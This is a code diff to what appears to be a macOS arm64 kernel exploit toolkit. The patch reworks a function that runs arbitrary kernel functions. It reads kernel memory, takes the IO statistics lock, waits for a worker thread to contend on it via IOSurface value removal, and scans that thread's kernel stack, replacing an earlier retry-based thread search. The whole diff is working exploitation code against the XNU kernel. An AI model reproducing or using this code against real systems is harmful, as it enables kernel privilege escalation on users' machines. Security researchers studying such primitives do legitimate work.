@@ -21,10 +21,12 @@
 #include "util/ptrauth.h"
 #include "util/log.h"
 #include "xnu/proc.h"
+#include "xnu/thread.h"
 #include "iokit/io_surface.h"
 #include "iokit/os_dictionary.h"
 #include "allocator/small_mem.h"
 #include "allocator/large_mem.h"
+#include "util/misc.h"
 
 #include "macos_params.h"
 #include "macos_arm64.h"
@@ -201,22 +203,6 @@ uintptr_t xe_util_kfunc_find_ptr(uintptr_t base, char* data, size_t data_size, u
 }
 
 
-int xe_util_kfunc_find_target_thread(uintptr_t proc, uintptr_t* ptr_out) {
-    uintptr_t target_thread = 0;
-    int error = 0;
-    int tries = 10;
-    do {
-        error = xe_util_kfunc_find_thread_with_state(proc, 0x1 | 0x8, &target_thread);
-        tries--;
-        xe_log_debug("cannot find thread, retrying...");
-        sleep(1);
-    } while (error != 0 && tries > 0);
-    xe_assert_cond(tries, >=, 0);
-    *ptr_out = target_thread;
-    return error;
-}
-
-
 void xe_util_kfunc_reset(xe_util_kfunc_t util) {
     // Reuse the previous addresses to avoid resigning pointers using PACDA
     uintptr_t block = xe_util_zalloc_alloc(util->block_allocator, 0);
@@ -262,19 +248,24 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     xe_log_debug("acquiring lock");
     xe_util_lck_rw_t io_statistics_lock = xe_util_lck_rw_lock_exclusive(proc, xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0));
     
-    dispatch_semaphore_t sem_surface_destroy = dispatch_semaphore_create(0);
+    uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
+    dispatch_semaphore_t sem_surface_destroying = dispatch_semaphore_create(0);
+    dispatch_semaphore_t sem_surface_destroyed = dispatch_semaphore_create(0);
     dispatch_async(xe_dispatch_queue(), ^() {
+        *waiting_thread = xe_xnu_thread_current_thread();
+        dispatch_semaphore_signal(sem_surface_destroying);
         xe_log_debug("io_surface remove value start");
         IOSurfaceRemoveValue(surface_ref, CFSTR("xe_util_kfunc_key"));
         xe_log_debug("io_surface remove value done");
-        dispatch_semaphore_signal(sem_surface_destroy);
+        dispatch_semaphore_signal(sem_surface_destroyed);
     });
     
-    uintptr_t target_thread;
-    error = xe_util_kfunc_find_target_thread(proc, &target_thread);
+    dispatch_semaphore_wait(sem_surface_destroying, DISPATCH_TIME_FOREVER);
+    dispatch_release(sem_surface_destroying);
+    error = xe_util_lck_rw_wait_for_contention(io_statistics_lock, *waiting_thread, 5000);
     xe_assert_err(error);
     
-    uintptr_t kstack = xe_kmem_read_uint64(target_thread, TYPE_THREAD_MEM_MACHINE_OFFSET + TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
+    uintptr_t kstack = xe_kmem_read_uint64(*waiting_thread, TYPE_THREAD_MEM_MACHINE_OFFSET + TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
     kstack -= STACK_SCAN_SIZE;
     
     char* kstack_buffer = malloc(STACK_SCAN_SIZE);
@@ -355,7 +346,8 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     xe_log_debug("releasing lock");
     xe_util_lck_rw_lock_done(&io_statistics_lock);
     xe_log_debug("waiting for function execution");
-    dispatch_semaphore_wait(sem_surface_destroy, DISPATCH_TIME_FOREVER);
+    dispatch_semaphore_wait(sem_surface_destroyed, DISPATCH_TIME_FOREVER);
+    dispatch_release(sem_surface_destroyed);
     xe_log_debug("completed function executing");
     xe_util_kfunc_reset(util);
     IOSurfaceDecrementUseCount(surface_ref);
